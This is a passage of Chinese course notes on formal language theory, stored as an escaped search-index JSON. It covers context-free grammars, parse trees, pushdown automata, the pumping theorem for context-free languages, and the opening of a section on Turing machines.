\u7ec8\u7ed3\u7b26\u96c6\u5408\uff08The set of terminal symbols\uff09<ul> <li>\\(V-\\Sigma\\): \u975e\u7ec8\u7ed3\u7b26\u96c6\u5408\uff08the set of non-terminals\uff09</li> <li>\u975e\u7ec8\u7ed3\u7b26\u4e00\u5b9a\u662f\u975e\u7a7a\u96c6\u5408\uff0c\u56e0\u4e3a\u8d77\u7801\u5305\u542b \\(S\\)</li> <li>\u800c\u7ec8\u7ed3\u7b26\u53ef\u4ee5\u4e3a\u7a7a\u96c6 \\(\\emptyset\\)</li> </ul> </li> <li>\\(S\\in V-\\Sigma\\): \u5f00\u59cb\u7b26\u53f7</li> <li>\\(R\\): \u89c4\u5219\u96c6\u5408<ul> <li>\\(R\\subseteq (V-\\Sigma) \\times V^*\\)</li> <li>\u662f\u53ef\u6570\u96c6\u5408\uff0c\u5f62\u5f0f\u4e3a \\(A\\rightarrow \\alpha\\)\uff0c\u5176\u4e2d \\(A\\in V-\\Sigma,\\; \\alpha \\in V^*\\)</li> </ul> </li> </ul> <p>CFG \u7684\u4e0a\u4e0b\u6587\u65e0\u5173\u4f53\u73b0\u5728 \\(R\\) \u4e2d\u7684 rules \u5de6\u4fa7\u53ea\u80fd\u662f\u5355\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff0c\u5373\u4e0e\u5468\u56f4\u7684\u7ec8\u7ed3\u7b26\u65e0\u5173\u3002</p> <p>\u7ec8\u7ed3\u7b26\u7684\u610f\u4e49\u5728\u4e8e\uff0c\u5728\u6839\u636e\u5b9a\u4e49\u7684\u89c4\u5219\u63a8\u5bfc\u8fc7\u7a0b\u4e2d\uff0c\u5b83\u4eec\u4e0d\u80fd\u88ab\u66ff\u6362\uff1b\u5f53\u63a8\u5bfc\u5230\u53ea\u5269\u4e0b\u7ec8\u7ed3\u7b26\u65f6\uff0c\u8868\u793a\u751f\u6210\u5b8c\u6210</p> <p>\u5bf9\u5e94\u7684\uff0c\u4e00\u4e2a\u8bed\u8a00 \\(L\\) \u662f Context-Free Language\uff08CFL\uff09 \u5f53\u4e14\u4ec5\u5f53\u5b58\u5728\u4e00\u4e2a CFG \\(G\\) \u4f7f\u5f97 \\(L=L(G)\\)\uff0c\u5373\u53ef\u4ee5\u88ab CFG \u751f\u6210\u3002</p> \u5224\u65ad\uff1aLanguage \\(L\\) is CFL iff \\(L=L(G)\\) <p>\u8fd9\u4e2a\u8868\u8ff0\u662f\u9519\u7684\uff0c\u8fd8\u8981\u8bf4\u660e \\(G\\) \u662f\u4e00\u4e2a CFG \ud83d\ude02</p> \u5224\u65ad\uff1aLanguage \\(L\\) is CFL iff it is accepted by a CFG <p>\u8fd9\u4e2a\u8868\u8ff0\u4e5f\u662f\u9519\u7684\uff0c\u6b63\u786e\u8868\u8ff0\u4e3a\uff1aLanguage \\(L\\) is CFL iff it is generated by a CFG</p> <p>Regular Language \u662f CFL \u7684\u5b50\u96c6\uff0c\u5373 All Regular Languages are CFL</p> \u4e3b\u9898 \u6b63\u89c4\u8bed\u8a00\uff08Regular Language\uff09 \u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00\uff08Context-Free Language, CFL\uff09 \u751f\u6210\u5de5\u5177\uff08Generation Device\uff09 Regular Expression\uff08\u6b63\u89c4\u8868\u8fbe\u5f0f\uff09 Context-Free Grammar\uff08\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\uff09 \u8bc6\u522b\u5de5\u5177\uff08Recognition Device\uff09 Finite Automata\uff08\u6709\u9650\u81ea\u52a8\u673a\uff0cFA\uff09 Pushdown Automata\uff08\u4e0b\u63a8\u81ea\u52a8\u673a\uff0cPDA\uff09 \u7b49\u4ef7\u5173\u7cfb\uff08Equivalence\uff09 FA \u21d4 Regular Expression PDA \u21d4 Context-Free Grammar <p>\u3010Example\u3011</p> \\[ L=\\{a^n b^n\\; |\\; n \\ge 0\\} \\] <ul> <li>\u7ec8\u7ed3\u7b26\u4e3a \\(\\{a,b\\}\\)</li> <li>\u5f00\u59cb\u7b26\u4e3a \\(S\\)</li> <li>\u4ea7\u751f\u5f0f\u96c6\u5408\u4e3a \\(\\{S\\rightarrow aSb, S\\rightarrow e\\}\\)<ul> <li>\u6216\u8005\u8868\u793a\u4e3a \\(\\{(S,aSb),\\; (S,e)\\}\\) \u6216 \\(\\{S\\rightarrow aSb\\; |\\; e\\}\\)</li> </ul> </li> </ul> <p>\u8fd9\u91cc\u7684\u5f00\u59cb\u7b26 \\(S\\) \u53ea\u662f\u751f\u6210\u89c4\u5219\u4e2d\u7684\u201c\u53d8\u91cf\u201d\uff0c\u6700\u7ec8\u8981\u5728\u63a8\u5bfc\u751f\u6210\u4e2d\u88ab\u66ff\u6362\u4e3a\u7ed3\u675f\u7b26</p> <p>\u3010More Example\u3011</p> \\[ L=\\{w\\in \\{a,b\\}^* \\;:\\; w=w^R\\} \\] <p>\u5373\u8bc1\u660e\u56de\u6587\u5b57\u7b26\u4e32\u662f\u4e0a\u4e0b\u6587\u65e0\u5173\u7684\uff0c\u6211\u4eec\u6784\u9020 CFG\uff1a</p> <ul> <li>\\(S\\rightarrow e,\\; S\\rightarrow a,\\; S\\rightarrow b\\)</li> <li>\\(S\\rightarrow aSa,\\; S\\rightarrow bSb\\)<ul> <li>\u53ef\u4ee5\u7b80\u5199\u4e3a \\(S\\rightarrow e \\;|\\; a \\;|\\; b \\;|\\; aSa \\;|\\; bSb\\)</li> </ul> </li> </ul> <p>\u540c Regular Language \u4e00\u6837\uff0cCFL \u4e5f\u5173\u4e8e\u64cd\u4f5c Union, Concatenation, Kleene Star \u95ed\u5305\uff0c\u4f46\u5bf9 Intersection \u548c Complementation \u4e0d\u95ed\u5305\uff1a</p> \u8fd0\u7b97 \u6b63\u5219\u8bed\u8a00 \u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00 \u5e76 (\\(\\cup\\)) \u2705 \u2705 \u4ea4 (\\(\\cap\\)) \u2705 \u274c \u8fde\u63a5 (\\(\\circ\\)) \u2705 \u2705 \u8865 (\\(\\bar{A}\\)) \u2705 \u274c Kleene \u661f (\\(*\\)) \u2705 \u2705 <p>\u4f46\u662f CFL \u548c\u6b63\u5219\u8bed\u8a00\u7684\u4ea4\u8fd0\u7b97\u662f\u5c01\u95ed\u7684\uff0c\u5373 \\(\\text{CFL} \\cap \\text{Regular}=\\text{CFL}\\)\uff0c\u5e38\u7528\u6765\u8bc1\u660e\u8bed\u8a00\u4e0d\u662f CFL</p>"},{"location":"Courses/tcs/Topic2/#parse-tree","title":"Parse Tree","text":"<p>CFG \u7684\u63a8\u5bfc\u53ef\u4ee5\u8868\u793a\u4e3a\u4e00\u4e2a Parse Tree\uff0c\u8be5\u6811\u7684\u53f6\u8282\u70b9\u5747\u4e3a terminal symbols\uff0c\u6839\u8282\u70b9\u4e3a start symbol\uff0c\u5176\u4f59\u8282\u70b9\u4e3a alphabet \\(V\\) \u4e2d\u7684\u5143\u7d20\u3002\u6211\u4eec\u5c06\u53f6\u8282\u70b9\u4ece\u5de6\u5230\u53f3\u62fc\u63a5\u6210\u5b57\u7b26\u4e32\uff0c\u5373\u53ef\u5f97\u5230\u8be5 Parse Tree \u5bf9\u5e94\u7684\u4ea7\u51fa\uff08yield\uff09\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e \\(a^nb ^n\\)\uff0c\u53ef\u4ee5\u7ed8\u5236\u5982\u4e0b parse tree \u8868\u793a \\(a^4 b^4 \\in a^n b^n\\)\uff1a</p> <p></p> <p>\u6211\u4eec\u79f0\u4e24\u4e2a\u63a8\u5bfc\u6ee1\u8db3 \\(D\\) precedes \\(D'\\):</p> <ul> <li>\u524d\u63d0\u573a\u666f\uff1a\\(x_{k-1}= x_{k-1}'= uAvBw\\)<ul> <li>\u8fd9\u8868\u793a\u5728\u7b2c \\(k-1\\) \u6b65\u65f6\uff0c\u5f53\u524d\u7684\u53e5\u578b\u4e2d\u540c\u65f6\u5305\u542b\u4e24\u4e2a\u975e\u7ec8\u7ed3\u7b26 \\(A\\) \u548c \\(B\\)\u3002</li> <li>\\(u, v, w\\) \u662f\u4e0a\u4e0b\u6587\uff08\u7531\u7ec8\u7ed3\u7b26\u6216\u975e\u7ec8\u7ed3\u7b26\u7ec4\u6210\u7684\u4e32\uff09\u3002</li> <li>\u6ce8\u610f\uff1a\\(A\\) \u5728 \\(B\\) \u7684\u5de6\u8fb9\u3002</li> </ul> </li> <li>\u63a8\u5bfc \\(D\\)\uff08\u5148\u5de6\u540e\u53f3\uff09\uff1a<ul> <li>\u7b2c \\(k\\) \u6b65 (\\(x_k = uyvBw\\))\uff1a\u5148\u5bf9\u5de6\u8fb9\u7684 \\(A\\) \u5e94\u7528\u89c4\u5219 \\(A \\rightarrow y\\)\u3002\u6b64\u65f6 \\(B\\) \u4fdd\u6301\u4e0d\u53d8\u3002</li> <li>\u7b2c \\(k+1\\) \u6b65 (\\(x_{k+1} = uyvzw\\))\uff1a\u518d\u5bf9 \\(B\\) \u5e94\u7528\u89c4\u5219 \\(B \\rightarrow z\\)\u3002</li> </ul> </li> <li>\u63a8\u5bfc \\(D'\\)\uff08\u5148\u53f3\u540e\u5de6\uff09\uff1a<ul> <li>\u7b2c \\(k\\) \u6b65 (\\(x'_k = uAvzw\\))\uff1a\u5148\u5bf9\u53f3\u8fb9\u7684 \\(B\\) \u5e94\u7528\u89c4\u5219 \\(B \\rightarrow z\\)\u3002\u6b64\u65f6 \\(A\\) \u4fdd\u6301\u4e0d\u53d8\u3002</li> <li>\u7b2c \\(k+1\\) \u6b65 (\\(x'_{k+1} = uyvzw\\))\uff1a\u518d\u5bf9 \\(A\\) \u5e94\u7528\u89c4\u5219 \\(A \\rightarrow y\\)\u3002</li> </ul> </li> <li>\u7ed3\u8bba\uff1a<ul> <li>\\(x_{k+1} = x'_{k+1}\\)\uff1a\u65e0\u8bba\u5148\u505a\u54ea\u4e00\u6b65\uff0c\u4e24\u6b65\u4e4b\u540e\u7684\u7ed3\u679c\u662f\u4e00\u6a21\u4e00\u6837\u7684\u3002</li> <li>\\(\\forall i \\neq k, x_i = x'_i\\)\uff1a\u9664\u4e86\u7b2c \\(k\\) \u6b65\u7684\u4e2d\u95f4\u72b6\u6001\u4e0d\u540c\uff0c\u63a8\u5bfc\u7684\u5176\u4ed6\u6240\u6709\u6b65\u9aa4\u5b8c\u5168\u4e00\u81f4\u3002</li> </ul> </li> </ul> <p>\u5728\u8fd9\u91cc\uff0c\u7531\u4e8e\u63a8\u5bfc \\(D\\) \u6709\u9650\u5904\u7406\u4e86\u5de6\u8fb9\u7684\u975e\u7ec8\u7ed3\u7b26 \\(A\\)\uff0c\u6309\u7167\u6807\u51c6\u201c\u6700\u5de6\u63a8\u5bfc\u201d\u539f\u5219\uff0c\u79f0 \\(D\\) \u5148\u4e8e \\(D'\\)\u3002</p> <p>Precede \u8bb0\u4e3a \u227a</p> <p>\u5728\u4e0a\u4e0b\u6587\u65e0\u5173\u6587\u6cd5\uff08CFG\uff09\u4e2d\uff0c\u63a8\u5bfc\u662f\u4e00\u4e2a\u7ebf\u6027\u7684\u65f6\u95f4\u8fc7\u7a0b\uff08\u4e00\u6b65\u63a5\u4e00\u6b65\uff09\uff0c\u800c\u5206\u6790\u6811\u662f\u4e00\u4e2a\u7a7a\u95f4\u7684\u5c42\u7ea7\u7ed3\u6784\u3002</p> <ul> <li>\u73b0\u8c61\uff1a\u5f53\u4e00\u4e2a\u53e5\u578b\u4e2d\u540c\u65f6\u5b58\u5728\u4e24\u4e2a\u975e\u7ec8\u7ed3\u7b26\uff08\u4f8b\u5982 \\(A\\) \u548c \\(B\\)\uff09\u65f6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9\u5148\u63a8\u5bfc \\(A\\)\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9\u5148\u63a8\u5bfc \\(B\\)\u3002</li> <li>\u672c\u8d28\uff1a\u53ea\u8981 \\(A\\) \u548c \\(B\\) \u662f\u201c\u5e76\u5217\u201d\u7684\uff08\u5373\u4e92\u4e0d\u4e3a\u7956\u5148\uff09\uff0c\u8c01\u5148\u8c01\u540e\u5e76\u4e0d\u5f71\u54cd\u6700\u7ec8\u751f\u6210\u7684\u6811\u5f62\u7ed3\u6784\u3002</li> <li>\u76ee\u7684\uff1a\u8fd9\u6bb5\u5b9a\u4e49\u5c31\u662f\u4e3a\u4e86\u628a\u8fd9\u79cd\u201c\u4ec5\u4ec5\u662f\u987a\u5e8f\u4e0d\u540c\uff0c\u4f46\u7ed3\u6784\u76f8\u540c\u201d\u7684\u63a8\u5bfc\u5f52\u4e3a\u4e00\u7c7b\uff0c\u79f0\u4e3a Similar\uff08\u76f8\u4f3c\uff09\u3002</li> </ul> <p>\u90a3\u4e48\u5bf9\u4e8e\u4e24\u4e2a\u63a8\u5bfc \\((D,D')\\)\uff0c\u5982\u679c\u5b83\u4eec\u5bf9\u8fd0\u7b97 precedes \u5173\u4e8e\u81ea\u53cd\u3001\u5bf9\u79f0\u3001\u4f20\u9012\u95ed\u5305\u65f6\uff0c\u6211\u4eec\u79f0\u63a8\u5bfc \\(D,D'\\) \u662f Similar \u7684\u3002</p> <p>\u5047\u5982\u4e00\u4e2a Grammer \\(G\\) \u5b58\u5728\u4e00\u4e9b\u53ef\u4ee5\u7531\u4e0d\u540c\u7684 Parse Tree \u63a8\u5bfc\u7684 String\uff0c\u5219\u6211\u4eec\u79f0 \\(G\\) \u662f ambiguous \u7684\u3002</p>"},{"location":"Courses/tcs/Topic2/#pushdown-automata","title":"Pushdown Automata","text":"<p>\u4e0b\u63a8\u81ea\u52a8\u673a\uff08Pushdown Automata, PDA\uff09\u662f\u4e00\u4e2a\u5e26\u6808\u7ed3\u6784\u7684 NFA\uff0c\u5b83\u53ef\u4ee5\u4f7f\u7528\u6808\u505a\u4e00\u4e9b\u8bb0\u5fc6\u529f\u80fd\u3002</p> <p>\u5728\u5f62\u5f0f\u5316\u5b9a\u4e49\u4e0a\uff0cPDA \u7531\u516d\u4e2a\u90e8\u5206\u7ec4\u6210 \\(P=(K,\\Sigma, \\Gamma, \\Delta, s, F)\\)\uff1a</p> <ul> <li>\\(\\Gamma\\): stack alphabet<ul> <li>\u6808\u4e2d\u80fd\u51fa\u73b0\u7684\u7b26\u53f7\u96c6\u5408</li> </ul> </li> <li>\\(\\Delta\\): transition relation<ul> <li>\\(\\Delta \\subseteq \\left(K\\times (\\Sigma \\cup \\{e\\})\\times \\Gamma^* \\right)\\times \\left(K\\times \\Gamma^* \\right)\\)</li> <li>\u76f8\u5bf9\u4e8e NFA \u7684 \\(\\left(K\\times (\\Sigma \\cup \\{e\\}) \\right)\\times K\\)\uff0c\u5728\u8f6c\u79fb\u524d\u540e\u90fd\u589e\u52a0\u4e86\u6808\u76f8\u5173\u5b57\u7b26\u4e32</li> <li>\u524d\u4e00\u4e2a \\(\\Gamma^*\\) \u662f\u6808\u9876\u5b57\u7b26\u4e32\uff0c\u5339\u914d\u540e pop \u51fa\u6765</li> <li>\u540e\u4e00\u4e2a \\(\\Gamma^*\\) \u662f\u8f6c\u79fb\u540e\u8981 push \u8fdb\u53bb\u7684\u5b57\u7b26\u4e32</li> </ul> </li> </ul> <p>\u6700\u540e\u5224\u65ad\u80fd\u5426\u63a5\u53d7\u4e00\u4e2a String \\(w\\) \u8981\u6c42\u4e0d\u4ec5\u72b6\u6001\u4f4d\u4e8e Final State\uff0c\u8fd8\u8981 Stack \u4e3a\u7a7a\u3002\u7528 \\(\\vdash\\) \u8868\u793a\uff0c\u5219\u8bb0\u4e3a\uff1a</p> \\[ (s,w,e)  \\vdash_M^* (p,e,e),\\; \\text{for some state }p\\in F \\] <p>\u76f8\u5e94\u7684\uff0c\u80fd\u88ab PDA \\(M\\) \u63a5\u53d7\u7684\u8bed\u8a00\u8bb0\u4e3a\uff1a</p> \\[ L(M)=\\{w\\;|\\; (s,w,e)  \\vdash_M^* (p,e,e),\\; \\text{for some }p\\in F\\} \\] <p>\u5728\u8868\u793a\u4e0a\uff0c\u6211\u4eec\u5728\u72b6\u6001\u8f6c\u79fb\u7684\u7bad\u5934\u4e0a\u65b0\u589e\u4e00\u4e2a\u9879\uff0c\u8868\u793a\u6211\u4eec\u4ece\u6808\u4e2d pop/push \u4e86\u4ec0\u4e48\u7b26\u53f7\uff0c\u4f8b\u5982 \\(\\left((p,u,\\beta), (q,\\gamma)\\right)\\in \\Delta\\)\uff1a</p> <p></p> <p>\u6211\u4eec\u4e00\u822c\u6240\u8bf4\u7684 PDA \u90fd\u662f\u975e\u786e\u5b9a\u6027\u7684\uff0c\u5141\u8bb8\u8bfb\u53d6\u4e00\u4e2a\u7b26\u53f7\u540e\uff08\u518d\u6839\u636e\u6808\u7684\u72b6\u6001\uff09\u505a\u4e0d\u540c\u8f6c\u79fb\uff0c\u4e5f\u5141\u8bb8\u505a e-transition\uff1b\u800c\u786e\u5b9a\u6027\u7684 PDA \u5e76\u4e0d\u4e0e CFL \u7b49\u4ef7\uff0c\u6b64\u5904\u4e0d\u518d\u8bc1\u660e\uff0c\u8bf7\u76f4\u63a5\u8bb0\u4f4f\u8fd9\u4e2a\u7ed3\u8bba\u3002</p> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e \\(L(M)=\\{ww^R\\; :\\; w\\in \\{a,b\\}^*\\}\\)\uff0c\u5b83\u7684 diagram \u5982\u4e0b\uff1a</p> <p></p> <p>\u66f4\u591a\u4f8b\u5b50\uff1a\u62e5\u6709\u76f8\u540c\u6570\u91cf \\(a\\) \u548c \\(b\\) \u7684 Language\uff01</p> <p></p> Is c necessary? <p>\\(c\\) \u88ab\u7528\u4f5c\u6808\u5e95\u6807\u5fd7\uff0c\u53ef\u4ee5\u7b80\u5316 PDA \u7684\u8bbe\u8ba1\uff0c\u4f46\u5e76\u4e0d\u662f\u5fc5\u8981\u7684\u3002</p> More Example <p></p> <p>\u4e8b\u5b9e\u4e0a\uff0c\u5bf9\u4e8e \\(L(G)=\\{wcw^R\\; : \\; w\\in \\{a,b\\}^*\\}\\) \u8fd9\u79cd\u62e5\u6709\u5f62\u5982 \\(R=\\{S\\rightarrow aSa\\;|\\; bSb\\;|\\;c\\}\\) \u7684\u89c4\u5219\u7684 CFG\uff0c\u53ef\u4ee5\u5206\u5982\u4e0b\u4e09\u6b65\u6784\u9020 PDA \u7684\u8f6c\u79fb\u65b9\u7a0b\uff1a</p> \\[\\begin{array}l I: &amp; ((p,e,e), (q,S)) &amp; \\#\u521d\u59cb\u538b\u6808 \\\\ II: &amp; ((q,e,S),(q,aSa)), ((q,e,S),(q,bSb)), ((q,e,S),(q,c)) &amp; \\#\u4e66\u5199\u89c4\u5219 \\\\ III: &amp; ((q,a,a),(q,e)), ((q,b,b),(q,e)), ((q,c,c),(q,e)) &amp; \\#\u8bfb\u53d6\u8f93\u5165 \\end{array} \\] \u5bf9\u5b57\u7b26\u4e32 abbcbba \u6309\u7167\u5982\u4e0a\u8f6c\u79fb\u65b9\u7a0b\u8fdb\u884c\u63a8\u5bfc \\[\\begin{array}l(\ud835\udc5d, \ud835\udc4e\ud835\udc4f\ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc52) \\vdash (\ud835\udc5e, \ud835\udc4e\ud835\udc4f\ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc46) \\vdash (\ud835\udc5e, \ud835\udc4e\ud835\udc4f\ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc4e\ud835\udc46\ud835\udc4e) \\vdash (\ud835\udc5e, \ud835\udc4f\ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc46\ud835\udc4e) \\\\ \\vdash (\ud835\udc5e, \ud835\udc4f\ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc4f\ud835\udc46\ud835\udc4f\ud835\udc4e) \\vdash (\ud835\udc5e, \ud835\udc4f\ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc4f\ud835\udc46\ud835\udc4f\ud835\udc4e) \\vdash (\ud835\udc5e, \ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc46\ud835\udc4f\ud835\udc4e) \\vdash (\ud835\udc5e, \ud835\udc4f\ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc4f\ud835\udc46\ud835\udc4f\ud835\udc4f\ud835\udc4e) \\\\ \\vdash (\ud835\udc5e, \ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc46\ud835\udc4f\ud835\udc4f\ud835\udc4e) \\vdash (\ud835\udc5e, \ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e, \ud835\udc50\ud835\udc4f\ud835\udc4f\ud835\udc4e) \\vdash^\u2217 (\ud835\udc5e, \ud835\udc52, \ud835\udc52)\\end{array}\\]"},{"location":"Courses/tcs/Topic2/#pumping-theorem-for-cfl","title":"Pumping Theorem for CFL","text":"<p>\u82e5\u00a0\\(L\\)\u00a0\u662f\u4e00\u4e2a Context-Free Language\uff0c\u5219\u5b58\u5728\u4e00\u4e2a\u5e38\u6570 pump length\u00a0\\(p\\in \\mathbb{Z}^*\\)\u00a0\u4f7f\u5f97\u00a0\\(\\forall w\\in L\\)\u00a0with\u00a0\\(|w|\\ge p\\)\u00a0\u53ef\u88ab\u5206\u4e3a 5 \u4e2a\u90e8\u5206 \\(w=uvxyz\\)\uff0c\u6ee1\u8db3\uff1a</p> <ul> <li>\\(\\forall i \\ge 0,\\; uv^i xy^iz\\in L\\)<ul> <li>\u65e0\u8bba\u6211\u4eec\u5c06 \\(v\\) \u548c \\(y\\) \u91cd\u590d\u591a\u5c11\u6b21\uff08\u5305\u62ec0\u6b21\uff0c\u5373\u5220\u9664\uff09\uff0c\u751f\u6210\u7684\u5b57\u7b26\u4e32\u4ecd\u7136\u5c5e\u4e8e \\(L\\)\u3002</li> </ul> </li> <li>\\(|v|+|y| &gt; 0\\) \u6216 \\(|vy|\\ge 1\\)<ul> <li>\u88ab pump \u7684\u5b57\u6bb5\u975e\u7a7a</li> <li>\\(v\\) \u548c \\(y\\) \u4e0d\u80fd\u540c\u65f6\u4e3a\u7a7a</li> </ul> </li> <li>\\(|vxy| \\le p\\)<ul> <li>\\(y\\) \u51fa\u73b0\u5728 String \u7684\u524d \\(p\\) \u4e2a\u5b57\u7b26\u5185</li> </ul> </li> </ul> <p>\u6cf5\u5b9a\u7406\u662f\u00a0Context-Free Language\u00a0\u7684\u4e00\u4e2a\u5fc5\u8981\u4e0d\u5145\u5206\u6761\u4ef6\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8bc1\u660e\u6cf5\u5b9a\u7406\u4e0d\u6210\u7acb\u6765\u8bc1\u660e\u8be5\u8bed\u8a00\u4e0d\u662f\u4e00\u4e2a Context-Free Language\u3002</p> <p>\u3010Example\u3011</p> <p>\u8bc1\u660e \\(L=\\{a^i b^j c^i d^j\\}\\) \u4e0d\u662f CFL\uff1a</p> <ul> <li>\u5bf9\u4e8e\u4efb\u610f \\(p\\ge 1\\)\uff0c\u53d6 \\(w=a^p b^p c^p d^p\\)\uff0c\u5219 \\(|w|=4p\\ge p\\)</li> <li>\u4efb\u610f\u5212\u5206 \\(w = uvxyz, |vxy| \\le p, |vy| \\ge 1\\)\uff0c\u5219 \\(vxy\\) \u6700\u591a\u5305\u542b\u4e24\u79cd\u5b57\u7b26</li> <li>\u6b64\u65f6\u53d6 \\(i=0\\)\uff0c\u5219\u6709 \\(u v^0 x y^0 z = uxz \\notin L\\)</li> </ul> <p>\u4ea7\u751f\u77db\u76fe\uff0c\u56e0\u6b64 \\(L\\) \u4e0d\u662f\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u8a00\u3002</p> <p>\u4e0d\u5b58\u5728\u5224\u65ad\u4efb\u610f\u8bed\u8a00\u662f\u5426\u4e3a CFL \u7684\u7b97\u6cd5</p> <ul> <li>\u8bc1\u660e\u8bed\u8a00\u4e0a\u4e0b\u6587\u65e0\u5173<ul> <li>\u6709\u9650</li> <li>\u6784\u9020 CFG \u6216 PDA</li> <li>\u8fd0\u7b97\u6027\u8d28</li> </ul> </li> <li>\u8bc1\u660e\u8bed\u8a00\u975e\u4e0a\u4e0b\u6587\u65e0\u5173<ul> <li>Pumping Theorem</li> <li>\u8fd0\u7b97\u6027\u8d28</li> </ul> </li> </ul>"},{"location":"Courses/tcs/Topic3/","title":"Turing Machine","text":""},{"location":"Courses/tcs/Topic3/#turing-machine","title":"Turing Machine","text":"<p> \u7ea6 2220 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>\u56fe\u7075\u673a\u90e8\u5206\u662f\u8003\u8bd5\u7684\u91cd\u70b9</p>"},{"location":"Courses/tcs/Topic3/#deterministic-turing-machine","title":"(Deterministic) Turing Machine","text":"<p>PDA \u7684\u5c40\u9650\u6027\u5728\u4e8e\u6211\u4eec\u53ea\u53ef\u5bf9\u6808\u9876\u7684\u5143\u7d20\u8fdb\u884c\u64cd\u4f5c\uff0c\u800c\u56fe\u7075\u673a\u5219\u8fdb\u4e00\u6b65\u5c06 Stack \u66ff\u6362\u4e3a Tape\uff0c\u5141\u8bb8\u4e00\u4e2a\u8bfb\u5199\u5934\u5728\u7eb8\u5e26\u4e0a\u4efb\u610f\u79fb\u52a8\u5e76\u8bfb\u5199\u3002</p> <p>\u56fe\u7075\u673a\u662f\u4e00\u79cd\u7406\u60f3\u5316\u7684\u8ba1\u7b97\u6a21\u578b\uff0c\u53ef\u4ee5\u770b\u4f5c\u662f\u4e00\u53f0\u62e5\u6709\u65e0\u9650\u957f\u78c1\u5e26\u548c\u8bfb\u5199\u5934\u7684\u7b80\u5355\u8ba1\u7b97\u673a\u3002\u78c1\u5e26\u88ab\u5212\u5206\u4e3a\u4e00\u7cfb\u5217\u683c\u5b50\uff0c\u6bcf\u683c\u53ef\u4ee5\u5b58\u653e\u4e00\u4e2a\u7b26\u53f7\uff1b\u673a\u5668\u6709\u4e00\u4e2a\u8bfb\u5199\u5934\uff0c\u6bcf\u6b21\u53ef\u8bfb\u5199\u5f53\u524d\u683c\u7b26\u53f7\u5e76\u5de6\u53f3\u79fb\u52a8\u4e00\u6b65\u3002\u6211\u4eec\u5c06\u5176\u4e2d\u4e00\u7aef\u8bbe\u4e3a\u5de6\u7aef\u6807\u5fd7\uff08\\(\\rhd\\)\uff09\uff0c\u7b26\u53f7\u8868 \\(\\Sigma\\) \u4e2d\u5305\u542b\u4e00\u4e2a\u7279\u6b8a\u7684\u7a7a\u767d\u7b26\uff08\\(\\sqcup\\)\uff09\u548c\u5de6\u7aef\u6807\u5fd7\uff0c\u4f46\u4e0d\u5305\u542b\u201c\u5411\u5de6\u201d\u201c\u5411\u53f3\u201d\u8fd9\u6837\u7684\u79fb\u52a8\u7b26\u53f7\u3002\u56fe\u7075\u673a\u901a\u8fc7\u6709\u9650\u7684\u72b6\u6001\u63a7\u5236\u5176\u884c\u4e3a\uff0c\u4efb\u4f55\u65f6\u523b\u5904\u4e8e\u67d0\u4e2a\u72b6\u6001\u5e76\u8bfb\u5199\u78c1\u5e26\u4e0a\u7684\u7b26\u53f7\uff0c\u4ece\u800c\u4e0d\u65ad\u8fdb\u884c\u8ba1\u7b97\u3002</p> <p>\u5728\u5f62\u5f0f\u5b9a\u4e49\u4e0a\uff0c\u4e00\u4e2a\u56fe\u7075\u673a\u7531\u4e94\u4e2a\u90e8\u5206\u7ec4\u6210 \\((K,\\Sigma,\\delta,s,H)\\)\uff1a</p> <ul> <li>\\(K\\)\uff1afinite set of states</li> <li>\\(\\Sigma\\)\uff1aalphabet<ul> <li>\u7279\u6b8a\u7b26\u53f7\u00a0\\(\\rhd\\)\uff08left end symbol\uff09\u8868\u793a\u7eb8\u5e26\u7684\u6700\u5de6\u4fa7\uff0c\u65e0\u6cd5\u8986\u76d6</li> <li>\u7279\u6b8a\u7b26\u53f7\u00a0\\(\\sqcup\\)\uff08blank symbol\uff09\u8868\u793a\u7eb8\u5e26\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u4e00\u4e2a\u7a7a\u683c\u5b50</li> <li>Alphabet \u4e2d\u4e0d\u5305\u62ec\u7279\u6b8a\u7b26\u53f7 \\(\\rightarrow, \\leftarrow\\)</li> </ul> </li> <li>\\(s\\in K\\)\uff1ainitial states</li> <li>\\(H\\subseteq K\\)\uff1aset of halting states</li> <li>\\(\\delta: (K-H)\\times \\Sigma \\rightarrow K\\times ((\\Sigma - \\{\\rhd\\})\\cup \\{\\leftarrow ,\\rightarrow \\})\\)\uff1atransition function<ul> <li>\\((K-H)\\)\uff1a\u975e\u505c\u673a\u72b6\u6001\uff0c\u505c\u673a\u72b6\u6001\u65e0\u6cd5\u8f6c\u79fb</li> <li>\\(\\Sigma\\)\uff1a\u8bfb\u5199\u5934\u8bfb\u5165\u7684\u7b26\u53f7</li> <li>\\((\\Sigma - \\{\\rhd\\})\\)\uff1a\u8bfb\u5199\u5934\u5199\u5165\u7684\u7b26\u53f7</li> <li>\\(\\{\\leftarrow, \\rightarrow\\}\\)\uff1a\u8bfb\u5199\u5934\u5411\u5de6/\u53f3\u79fb\u52a8</li> <li>\u8bfb\u5199\u5934\u4ece Left End 